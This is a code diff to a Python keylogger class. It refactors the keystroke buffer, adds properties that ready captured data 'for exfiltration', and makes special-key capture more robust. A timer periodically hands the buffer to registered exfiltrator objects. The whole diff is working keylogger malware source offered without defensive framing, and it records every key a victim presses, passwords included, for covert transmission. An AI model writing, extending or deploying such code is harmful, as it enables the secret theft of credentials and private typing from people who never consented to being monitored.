@@ -20,7 +20,7 @@ class KeyLogger(object):
         """
 
         self.exfil_time = exfil_time
-        self.captured_data: list[str] = ["Keylogger Initialized"]
+        self.data_buffer: list[str] = ["Keylogger Initialized"]
         self.__exfiltrators = list()
 
         '''Mapping of key names to string characters for human-readable 
@@ -28,8 +28,17 @@ class KeyLogger(object):
         host and the character set it works with.'''
         self.key_mapping: dict[str: str] = {"space": " "}
 
-    def __str__(self):
-        return "".join(self.captured_data)
+    @property
+    def contents(self) -> str:
+        """Get a string representation of the data buffered by the
+        keylogger for exfiltration."""
+        return "".join(self.data_buffer)
+
+    @property
+    def has_data(self) -> bool:
+        """Returns True if the keylogger has data ready for exfiltration
+        and False otherwise."""
+        return bool(len(self.data_buffer))
 
     def register_exfiltrator(self, exfiltrator) -> None:
         """Register an instance of a child-class of Exfiltrator as an
@@ -43,17 +52,22 @@ class KeyLogger(object):
         [exfiltrator.update() for exfiltrator in self.__exfiltrators]
         Timer(interval=self.exfil_time,
               function=self._notify_all_exfiltrators).start()
-        self.captured_data.clear()
+        self.data_buffer.clear()
 
     def _on_press(self, key: keyboard.Key) -> None:
-        try:
-            pressed_key: str = key.char  # Alphanumeric key was pressed
-        except AttributeError:  # Special key was pressed
+        """Add the string representation of each key stroke captured by
+        the listener thread to the exfiltration buffer."""
+        try:  # A key was pressed and caught by the listener
+            pressed_key: str = key.char  # The key is alphanumeric
+        except AttributeError:  # The key is special
             try:  # Translate the key's value through custom mapping...
                 pressed_key = self.key_mapping[key.name]
             except KeyError:  # ... or use the key's name as a result
-                pressed_key = f"[{key.name.upper()}]"
-        self.captured_data.append(pressed_key)
+                try:  # The special key is valid and has a name...
+                    pressed_key = f"[{key.name.upper()}]"
+                except AttributeError:  # ... or is unknown
+                    pressed_key = "[???]"
+        self.data_buffer.append(pressed_key)
 
     def _on_release(self, key: keyboard.Key) -> None:
         ...
